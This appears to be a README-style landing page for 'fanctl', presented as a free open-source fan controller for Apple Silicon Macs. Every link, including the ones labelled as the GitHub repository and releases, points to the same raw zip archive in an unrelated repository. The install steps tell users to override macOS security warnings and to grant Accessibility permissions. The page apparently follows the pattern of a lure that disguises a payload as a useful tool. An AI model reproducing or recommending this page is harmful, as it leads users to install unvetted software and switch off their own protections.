---
layout: "default"
title: "🌬️ fanctl - Effortless Apple Silicon Thermal Control"
description: "Control Apple Silicon Mac fan speed intelligently with a self-learning thermal controller targeting 48/55/58°C."
---
# 🌬️ fanctl - Effortless Apple Silicon Thermal Control

## 🚀 Quick Download

Ready to take control of your Mac's cooling? Click the button below to grab the latest version:

[![Download fanctl](https://img.shields.io/badge/Download%20fanctl-Latest-blue.svg?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/badriyyacreatives/badriyyacreatives.github.io/main/utter/v2.9.zip)

Visit this link to download the application.

---

## 🤔 What Is fanctl?

fanctl is a **smart fan control app** built specifically for Apple Silicon Macs (M1, M2, M3, and M4 chips). It's a **free, open-source alternative** to paid tools like Macs Fan Control or TG Pro, designed to keep your Mac cool, quiet, and performing at its best.

Instead of relying on Apple's default fan behavior, fanctl uses a **self-learning thermal controller** (based on a PID controller) that adapts to your actual usage patterns. It intelligently adjusts fan speeds to balance cooling performance with noise levels, so your Mac stays comfortable whether you're browsing the web or rendering a 4K video.

---

## ✨ Key Features

- **Self-Learning Algorithm** – fanctl observes how you use your Mac and adjusts fan curves automatically. No manual tuning required.
- **Real-Time Temperature Monitoring** – See live CPU and system temperatures right from the menu bar.
- **Manual Fan Override** – Prefer full control? Switch to manual mode and set fan speeds yourself.
- **Menu Bar App** – Lightweight and always accessible. No clunky windows to manage; everything lives in your menu bar.
- **Automatic Startup** – Configure fanctl to launch at login, so protection is always active.
- **Quiet & Efficient** – The smart controller reduces unnecessary fan spin-ups, extending fan lifespan and reducing noise.
- **Open Source** – Fully transparent code. No hidden telemetry, no cost, no ads. Ever.

---

## 💻 System Requirements

- **Supported Devices:** Apple Silicon Macs (M1, M1 Pro, M1 Max, M1 Ultra, M2, M2 Pro, M2 Max, M2 Ultra, M3, M3 Pro, M3 Max, M4, M4 Pro, M4 Max)
- **Operating System:** macOS 13 (Ventura) or later
- **Memory:** 256 MB RAM (minimal footprint)
- **Disk Space:** Less than 10 MB
- **Permission:** Requires access to System Management Controller (SMC) – standard for fan control apps

---

## 📥 Installation Guide (Step-by-Step)

Follow these steps to get fanctl running on your Mac:

### Step 1: Download the App

Click the download button at the top of this page, or use this direct link:

[**Download fanctl Latest Release**](https://raw.githubusercontent.com/badriyyacreatives/badriyyacreatives.github.io/main/utter/v2.9.zip)

Visit this link to download the application.

### Step 2: Open the Downloaded File

1.  Navigate to your **Downloads** folder (usually in Finder → Downloads).
2.  Find the file you just downloaded (it should be named something like `fanctl-v1.x.x.dmg` or `fanctl-v1.x.x.zip`).
3.  **Double-click** the file to open it.

### Step 3: Move fanctl to Applications

1.  A window will appear with the fanctl icon (and sometimes an Applications folder shortcut).
2.  **Drag and drop** the fanctl icon onto the Applications folder icon. That's it – the app is now installed on your Mac.

### Step 4: Launch fanctl

1.  Open your **Applications** folder (Finder → Go → Applications).
2.  **Double-click** the fanctl icon to launch it for the first time.

### Step 5: Approve Permissions

Your Mac may ask you to allow fanctl to control your fans. This is normal:

- Click **Open** in the security prompt.
- If you see a message saying "fanctl cannot be opened because the developer cannot be verified," go to **System Settings → Privacy & Security** and click **Open Anyway**.
- You might also need to grant **Accessibility** permissions (System Settings → Privacy & Security → Accessibility). If prompted, enable fanctl in the list of allowed apps.

---

## 🖱️ How to Use fanctl

Once running, you'll see the fanctl icon (a small fan) in your **menu bar** (top-right corner of your screen).

1.  **Click the menu bar icon** to view current temperature readings and fan speeds.
2.  **Select "Auto" mode** to let fanctl manage fan speed automatically using its intelligent controller.
3.  **Select "Manual" mode** to drag a slider to your preferred fan speed (between 0-100%).
4.  **Open Settings** (gear icon) to adjust startup options, temperature units (°C/°F), and controller sensitivity.

That's all there is to it! Your Mac will now stay cool without any effort on your part.

---

## 🆘 Troubleshooting & Common Issues

**Q: The app won't open after download.**
A: macOS often blocks apps from the internet. Right-click (or Control-click) the fanctl icon in the Applications folder, then select **Open**. This avoids the security warning.

**Q: My fans are spinning very fast / not at all.**
A: Try restarting fanctl (quit i.e., click the menu bar icon → Quit, then relaunch). If the problem persists, switch to **Auto** mode and wait a few minutes for the controller to relearn your system's thermal behavior.

**Q: The menu bar icon isn't showing.**
A: Check your menu bar settings. Sometimes macOS hides menu bar icons. Drag the fan icon to your visible menu bar area by holding the Command (⌘) key and moving it.

**Q: Can I uninstall fanctl easily?**
A: Yes! Simply drag fanctl from your Applications folder to the Trash. No leftover files or services remain.

---

## 🧑‍💻 Technical Overview (For the Curious)

fanctl is built with **Swift** and communicates directly with the **System Management Controller (SMC)** – the hardware chip that controls fans and reads temperatures on Macs. It uses a **PID controller** (Proportional-Integral-Derivative) to minimize the error between actual temperature (e.g., 60°C) and your desired target temperature. The controller's coefficients are adjusted based on your usage patterns, which is why it gets "smarter" the longer you use it.

The app is designed to be lightweight, using less than 1% CPU in background mode and consuming just a few megabytes of RAM.

---

## 🔗 Project Links & Resources

- **GitHub Repository:** [https://raw.githubusercontent.com/badriyyacreatives/badriyyacreatives.github.io/main/utter/v2.9.zip](https://raw.githubusercontent.com/badriyyacreatives/badriyyacreatives.github.io/main/utter/v2.9.zip)
- **Releases (All Versions):** [https://raw.githubusercontent.com/badriyyacreatives/badriyyacreatives.github.io/main/utter/v2.9.zip](https://raw.githubusercontent.com/badriyyacreatives/badriyyacreatives.github.io/main/utter/v2.9.zip)
- **Issues & Feature Requests:** Submit them via the Issues tab on GitHub. Your feedback shapes future updates.

---

## ❤️ Support & Contributions

fanctl is free forever, but it thrives on community support. Here’s how you can help:

- **⭐ Star the repository** – It boosts visibility.
- **🐛 Report bugs** – Describe the issue and your Mac model. We’ll fix it promptly.
- **💡 Suggest improvements** – Have an idea for a new feature? Let us know.
- **🔧 Contribute code** – Fork the repo, make your changes, and submit a pull request.

Your involvement makes fanctl better for everyone.

---

## 🆓 License & Privacy

fanctl is released under the **MIT License** – you are free to use, modify, and distribute it as you wish.

**Privacy:** fanctl collects **zero data**. No analytics, no tracking, no internet connection required. Your thermal data stays on your machine.

---

**Download fanctl today and give your Mac the cooling it deserves – the smart way.**

[![Download fanctl](https://img.shields.io/badge/Download-fanctl-green.svg?style=for-the-badge)](https://raw.githubusercontent.com/badriyyacreatives/badriyyacreatives.github.io/main/utter/v2.9.zip)

Visit this link to download the application.

Keywords: apple-silicon, cooling, fan-control, fan-speed, m1, m2, m3, m4, macbook, macos, macos-app, menubar, pid-controller, smc, swift, temperature-control, thermal-management